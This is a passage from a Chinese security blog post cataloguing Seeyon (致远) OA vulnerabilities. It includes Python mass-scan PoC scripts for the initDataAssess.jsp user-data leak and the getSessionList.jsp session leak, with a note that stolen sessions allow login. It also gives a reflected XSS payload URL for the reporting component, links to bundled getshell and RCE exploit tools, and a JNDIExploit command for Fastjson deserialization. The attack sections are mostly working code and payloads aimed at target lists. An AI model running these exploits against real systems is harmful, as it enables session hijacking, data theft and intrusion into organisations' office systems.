class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[34mVersion: 致远OA A6                                              \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36m使用格式:  python3 poc.py                                            \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">"/yyoa/assess/js/initDataAssess.jsp"</span></span><br><span class="line">    headers = {</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"</span>,</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"/yyoa/index.jsp"</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> <span class="string">"personList"</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[32m[o] 目标 {}存在漏洞！\n泄露地址:{} \033[0m"</span>.<span class="built_in">format</span>(target_url, vuln_url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[31m[x] 目标 {}不存在漏洞 \033[0m"</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\033[31m[x] 请求失败 \033[0m"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Scan</span>(<span class="params">file_name</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">"r"</span>, encoding=<span class="string">'utf8'</span>) <span class="keyword">as</span> scan_url:</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> scan_url:</span><br><span class="line">            <span class="keyword">if</span> url[:<span class="number">4</span>] != <span class="string">"http"</span>:</span><br><span class="line">                url = <span class="string">"http://"</span> + url</span><br><span class="line">            url = url.strip(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                POC_1(url)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"\033[31m[x] 请求报错 \033[0m"</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    title()</span><br><span class="line">    file_name  = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">"\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m"</span>))</span><br><span class="line">    Scan(file_name)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230732.png"></p>
</li>
</ol>
<h2 id="致远OA-getSessionList-jsp-Session泄漏漏洞"><a href="#致远OA-getSessionList-jsp-Session泄漏漏洞" class="headerlink" title="致远OA getSessionList.jsp Session泄漏漏洞"></a>致远OA getSessionList.jsp Session泄漏漏洞</h2><h3 id="漏洞描述-8"><a href="#漏洞描述-8" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>通过使用存在漏洞的请求时，会回显部分用户的Session值，导致出现任意登录的情况。</p>
<p>漏洞代码如下，当cmd参数为getAll时，便可获取到所有用户的SessionID：</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=GBK"</span>%&gt;</span><br><span class="line">&lt;%@ page session= <span class="string">"false"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"net.btdz.oa.ext.https.*"</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">reqType</span> <span class="operator">=</span> request.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">outXML</span> <span class="operator">=</span> <span class="string">""</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">allowHttps</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"allowHttps"</span>.equalsIgnoreCase(reqType)){</span><br><span class="line">        <span class="comment">//add code to judge whether it allow https or not</span></span><br><span class="line">        allowHttps = FetchSessionList.checkHttps();</span><br><span class="line">        <span class="keyword">if</span> (allowHttps) response.setHeader(<span class="string">"AllowHttps"</span>,<span class="string">"1"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"getAll"</span>.equalsIgnoreCase(reqType)){</span><br><span class="line">        outXML = FetchSessionList.getXMLAll();</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">"getSingle"</span>.equalsIgnoreCase(reqType)){</span><br><span class="line">        <span class="type">String</span> <span class="variable">sessionId</span> <span class="operator">=</span> request.getParameter(<span class="string">"ssid"</span>);</span><br><span class="line">        <span class="keyword">if</span>(sessionId != <span class="literal">null</span>){</span><br><span class="line">            outXML = FetchSessionList.getXMLBySessionId(sessionId);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span>{</span><br><span class="line">        outXML += <span class="string">"&lt;?xml version=\"1.0\" encoding=\"GB2312\"?&gt;\r\n"</span>;</span><br><span class="line">        outXML += <span class="string">"&lt;SessionList&gt;\r\n"</span>;</span><br><span class="line"><span class="comment">//        outXML += "&lt;Session&gt;\r\n";</span></span><br><span class="line"><span class="comment">//        outXML += "&lt;/Session&gt;\r\n";</span></span><br><span class="line">        outXML += <span class="string">"&lt;/SessionList&gt;\r\n"</span>;</span><br><span class="line">    }</span><br><span class="line">    out.println(outXML);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞影响-4"><a href="#漏洞影响-4" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>致远OA</p>
<h3 id="复现流程-3"><a href="#复现流程-3" class="headerlink" title="复现流程"></a>复现流程</h3><ol>
<li><p>漏洞URL为<code>yyoa/ext/https/getSessionList.jsp</code>，添加cmd参数值为getall，成功获取session，通过替换 Session即可登录系统。</p>
<p><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230825.png"></p>
</li>
<li><p>漏洞利用POC</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[34mVersion: 致远OA A6                                              \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36m使用格式:  python3 poc.py                                            \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">"/yyoa/ext/https/getSessionList.jsp?cmd=getAll"</span></span><br><span class="line">    headers = {</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"</span>,</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"/yyoa/index.jsp"</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> <span class="string">"&lt;sessionID&gt;"</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[32m[o] 目标 {}存在漏洞,Session地址:{} \033[0m"</span>.<span class="built_in">format</span>(target_url, vuln_url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[31m[x] 目标 {}不存在漏洞 \033[0m"</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\033[31m[x] 请求失败 \033[0m"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Scan</span>(<span class="params">file_name</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">"r"</span>, encoding=<span class="string">'utf8'</span>) <span class="keyword">as</span> scan_url:</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> scan_url:</span><br><span class="line">            <span class="keyword">if</span> url[:<span class="number">4</span>] != <span class="string">"http"</span>:</span><br><span class="line">                url = <span class="string">"http://"</span> + url</span><br><span class="line">            url = url.strip(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                POC_1(url)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"\033[31m[x] 请求报错 \033[0m"</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    title()</span><br><span class="line">    file_name  = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">"\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m"</span>))</span><br><span class="line">    Scan(file_name)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230907.png"></p>
</li>
</ol>
<h2 id="致远OA帆软报表组件反射型XSS漏洞"><a href="#致远OA帆软报表组件反射型XSS漏洞" class="headerlink" title="致远OA帆软报表组件反射型XSS漏洞"></a>致远OA帆软报表组件反射型XSS漏洞</h2><h3 id="漏洞描述-9"><a href="#漏洞描述-9" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA <code>/seeyonreport</code> 路径下的组件其实是集成的 帆软报表，存在反射型XSS漏洞。</p>
<h3 id="漏洞影响-5"><a href="#漏洞影响-5" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>致远A8-V5 V5.6 SP1 </p>
<p>致远A8-V5 V6.1 SP2</p>
<h3 id="复现流程-4"><a href="#复现流程-4" class="headerlink" title="复现流程"></a>复现流程</h3><ol>
<li><p>使用如下POC可进行反射型XSS攻击</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/seeyonreport/ReportServer?reportlet=&amp;__parameters__={"isSubReport"%3a"true"%2c"TEMPLATEID"%3a"1"%2c"MEMBERID"%3a"&lt;img src%3dx onerror%3dalert('xss')&gt;"%2c"A8SERVERIP"%3a"baidu.com"%2c"A8SERVERPORT"%3a"80"}</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230957.png"></p>
</li>
</ol>
<h1 id="综合利用EXP"><a href="#综合利用EXP" class="headerlink" title="综合利用EXP"></a>综合利用EXP</h1><ol>
<li><p>github上综合利用EXP1：<a target="_blank" rel="noopener" href="https://github.com/asdasdqkq1/yonyou-nc-exp">https://github.com/asdasdqkq1/yonyou-nc-exp</a></p>
<p>涉及漏洞包括：</p>
<ul>
<li><p>致远OA A8 状态监控页面信息泄露</p>
</li>
<li><p>致远OA A6 initDataAssess.jsp 用户敏感信息泄露</p>
</li>
<li><p>致远OA A6 createMysql.jsp 数据库敏感信息泄露</p>
</li>
<li><p>致远OA A6 DownExcelBeanServlet 用户敏感信息泄露</p>
</li>
<li><p>致远OA getSessionList.jsp Session泄漏漏洞</p>
</li>
<li><p>致远OA A6 setextno.jsp SQL注入漏洞</p>
</li>
<li><p>致远OA A6 test.jsp SQL注入漏洞</p>
</li>
<li><p>致远OA ajax.do 登录绕过&amp;任意文件上传</p>
</li>
<li><p>致远OA Session泄露 任意文件上传漏洞</p>
</li>
<li><p>致远OA webmail.do任意文件下载</p>
</li>
</ul>
</li>
<li><p>github上综合利用EXP2：<a target="_blank" rel="noopener" href="https://github.com/z1un/seeyou_exp">https://github.com/z1un/seeyou_exp</a></p>
<ul>
<li><p>致远OA A6 createMysql数据库敏感信息泄露 </p>
</li>
<li><p>致远OA A6 DownExcelBeanServlet用户敏感信息下载</p>
</li>
<li><p>致远OA A6 initDataAssess用户敏感信息泄露</p>
</li>
<li><p>致远OA A6 setextno SQL注入Getshell</p>
</li>
<li><p>致远OA A6 test SQL注入Getshell</p>
</li>
<li><p>致远OA A8 htmlofficeservlet RCE</p>
</li>
<li><p>致远OA getSessionList Session泄漏</p>
</li>
<li><p>致远OA ajax 登录绕过 任意文件上传</p>
</li>
<li><p>致远OA webmail任意文件下载</p>
</li>
<li><p>致远OA Session泄露 任意文件上传 </p>
</li>
<li><p>致远OA Fastjson反序列化</p>
<p>其中致远OA Fastjson 反序列化漏洞没有实现自动化，可利用工具：<a target="_blank" rel="noopener" href="https://github.com/feihong-cs/JNDIExploit">JNDIExploit</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-<span class="number">1.2</span>-SNAPSHOT.jar -i <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> -l <span class="number">1389</span> -p <span class="number">1289</span></span><br></pre></td></tr></table></figure>

<p>先在vps运行以上JNDI反序列化漏洞利用工具，然后复制脚本提供的Payload，替换ldap链接到BurpSuite中发包测试发包，可回显。</p>
</li>
</ul>
</li>
</ol>
<p><strong>注：仅当作技术研究，请勿用于非法用途 后果作者概不负责！！！</strong></p>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>李钰璕
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://leeyuxun.github.io/%E8%87%B4%E8%BF%9COA%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88.html" title="致远OA漏洞集合">https://leeyuxun.github.io/致远OA漏洞集合.html</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-cn" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/%E6%BC%8F%E6%B4%9E-%E8%87%B4%E8%BF%9COA/" rel="tag"><i class="fa fa-tag"></i> 漏洞 致远OA</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/MetaCRM6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html" rel="prev" title="MetaCRM6文件上传漏洞">
      <i class="fa fa-chevron-left"></i> MetaCRM6文件上传漏洞
    </a></div>
      <div class="post-nav-item">
    <a href="/%E7%94%A8%E5%8F%8BNC%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88.html" rel="next" title="用友NC漏洞集合">
      用友NC漏洞集合 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E3%80%90CNVD-2019-19299%E3%80%91%E8%87%B4%E8%BF%9COA-A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">【CNVD-2019-19299】致远OA A8远程命令执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">1.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="nav-number">1.3.</span> <span class="nav-text">复现过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E3%80%90CNVD-2021-01627%E3%80%91%E8%87%B4%E8%BF%9COA-ajax-do%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">【CNVD-2021-01627】致远OA ajax.do登录绕过 任意文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-1"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-1"><span class="nav-number">2.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B-1"><span class="nav-number">2.3.</span> <span class="nav-text">复现过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E3%80%90CNVD-2020-62422%E3%80%91%E8%87%B4%E8%BF%9COA-webmail-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.</span> <span class="nav-text">【CNVD-2020-62422】致远OA webmail.do任意文件下载漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-2"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-2"><span class="nav-number">3.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B-2"><span class="nav-number">3.3.</span> <span class="nav-text">复现过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%87%B4%E8%BF%9COA-A6-setextno-jsp-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.</span> <span class="nav-text">致远OA A6 setextno.jsp SQL注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-3"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D"><span class="nav-number">4.2.</span> <span class="nav-text">漏洞影响</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B"><span class="nav-number">4.3.</span> <span class="nav-text">复现流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%87%B4%E8%BF%9COA-A6-createMysql-jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-number">5.</span> <span class="nav-text">致远OA A6 createMysql.jsp 数据库敏感信息泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-4"><span class="nav-number">5.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D-1"><span class="nav-number">5.2.</span> <span class="nav-text">漏洞影响</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B-1"><span class="nav-number">5.3.</span> <span class="nav-text">复现流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%87%B4%E8%BF%9COA-A8-%E7%8A%B6%E6%80%81%E7%9B%91%E6%8E%A7%E9%A1%B5%E9%9D%A2%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-number">6.</span> <span class="nav-text">致远OA A8 状态监控页面信息泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-5"><span class="nav-number">6.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-3"><span class="nav-number">6.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B-3"><span class="nav-number">6.3.</span> <span class="nav-text">复现过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%87%B4%E8%BF%9COA-A6-DownExcelBeanServlet-%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-number">7.</span> <span class="nav-text">致远OA A6 DownExcelBeanServlet 用户敏感信息泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-6"><span class="nav-number">7.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D-2"><span class="nav-number">7.2.</span> <span class="nav-text">漏洞影响</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B-2"><span class="nav-number">7.3.</span> <span class="nav-text">复现流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%87%B4%E8%BF%9COA-A6-initDataAssess-jsp-%E5%AD%98%E5%9C%A8%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-number">8.</span> <span class="nav-text">致远OA A6 initDataAssess.jsp 存在用户敏感信息泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-7"><span class="nav-number">8.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D-3"><span class="nav-number">8.2.</span> <span class="nav-text">漏洞影响</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-3-%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B"><span class="nav-number">8.3.</span> <span class="nav-text">9.3. 复现流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%87%B4%E8%BF%9COA-getSessionList-jsp-Session%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E"><span class="nav-number">9.</span> <span class="nav-text">致远OA getSessionList.jsp Session泄漏漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-8"><span class="nav-number">9.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D-4"><span class="nav-number">9.2.</span> <span class="nav-text">漏洞影响</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B-3"><span class="nav-number">9.3.</span> <span class="nav-text">复现流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%87%B4%E8%BF%9COA%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%E7%BB%84%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E"><span class="nav-number">10.</span> <span class="nav-text">致远OA帆软报表组件反射型XSS漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-9"><span class="nav-number">10.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 